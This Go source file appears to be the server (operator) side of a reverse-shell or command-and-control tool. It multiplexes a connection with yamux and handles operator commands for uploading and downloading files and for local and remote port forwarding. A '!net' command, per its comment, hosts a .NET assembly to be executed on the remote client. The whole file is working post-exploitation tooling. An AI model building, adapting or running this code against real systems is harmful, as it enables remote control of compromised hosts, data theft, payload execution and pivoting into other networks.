package server

import (
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"strings"
	"time"

	"../utils"
	"github.com/hashicorp/yamux"
)

var gc net.Conn
var gs *yamux.Session

type augReader struct {
	innerReader io.Reader
	augFunc     func([]byte) []byte
}

type augWriter struct {
	innerWriter io.Writer
	augFunc     func([]byte) []byte
}

func (r *augReader) Read(buf []byte) (int, error) {
	tmpBuf := make([]byte, len(buf))
	n, err := r.innerReader.Read(tmpBuf)
	copy(buf[:n], r.augFunc(tmpBuf[:n]))
	return n, err
}

func (w *augWriter) Write(buf []byte) (int, error) {
	return w.innerWriter.Write(w.augFunc(buf))
}

func sendReader(r io.Reader) io.Reader {
	return &augReader{innerReader: r, augFunc: handleCmd}
}

func recvWriter(w io.Writer) io.Writer {
	return &augWriter{innerWriter: w, augFunc: handleCmd}
}

var (
	session *yamux.Session
)

// opens the listening socket on the server side
func lfwd(port string) {
	ln, err := net.Listen("tcp", fmt.Sprintf(":%s", port))
	if err != nil {
		log.Fatalln(err)
	}
	log.Printf("Listening on %s\n", port)
	for {
		fwdCon, err := ln.Accept()
		defer fwdCon.Close()
		if err != nil {
			log.Fatalln(err)
		}
		proxy, err := session.Open()
		if err != nil {
			panic(err)
		}
		go utils.CopyIO(fwdCon, proxy)
		go utils.CopyIO(proxy, fwdCon)
	}
}

// connects to the listening port on the client side
func rfwd(host string, port string, s *yamux.Session, c net.Conn) {
	for {
		proxy, err := s.Accept()
		if err != nil {
			log.Println(err)
			return
		}
		fwdCon, err := net.Dial("tcp", fmt.Sprintf("%s:%s", host, port))
		if err != nil {
			log.Println(err)
			return
		}
		defer fwdCon.Close()
		go utils.CopyIO(fwdCon, proxy)
		go utils.CopyIO(proxy, fwdCon)
	}
}

func exit() {
	time.Sleep(1000 * time.Millisecond)
	fmt.Println("Bye!")
	os.Exit(0)
}

func handleCmd(buf []byte) []byte {
	cmd := strings.TrimSuffix(string(buf), "\r\n")
	cmd = strings.TrimSuffix(cmd, "\n")
	argv := strings.Split(cmd, " ")
	switch argv[0] {
	case "!exit":
		// defer exit so we can sent it to the client aswell
		go exit()
	case "!download":
		if len(argv) == 3 {
			dst := argv[2]
			go utils.DownloadListen(dst, session)
		}
	case "!lfwd":
		if len(argv) == 4 {
			lport := argv[1]
			go lfwd(lport)
		}
	case "!rfwd":
		if len(argv) == 4 {
			host := argv[2]
			port := argv[3]
			go rfwd(host, port, gs, gc)
		}
	case "!upload":
		if len(argv) != 3 {
			return buf
		}
		src := argv[1]
		go utils.UploadListen(src, session)
	case "!net":
		// same as upload for the server side, hosts the .NET assembly we want to execute
		if len(argv) < 3 {
			return buf
		}
		src := argv[1]
		go utils.UploadListen(src, session)
	}
	return buf
}

// Run runs the main server loop
func Run(s *yamux.Session, c net.Conn) {
	gc = c
	gs = s
	session = s
	defer c.Close()
	sr := sendReader(os.Stdin)  // intercepts input that is given on stdin and then send to the network
	rw := recvWriter(os.Stdout) // intercepts output that is to received from network andthen  send to stdout
	go io.Copy(c, sr)
	io.Copy(rw, c)
}
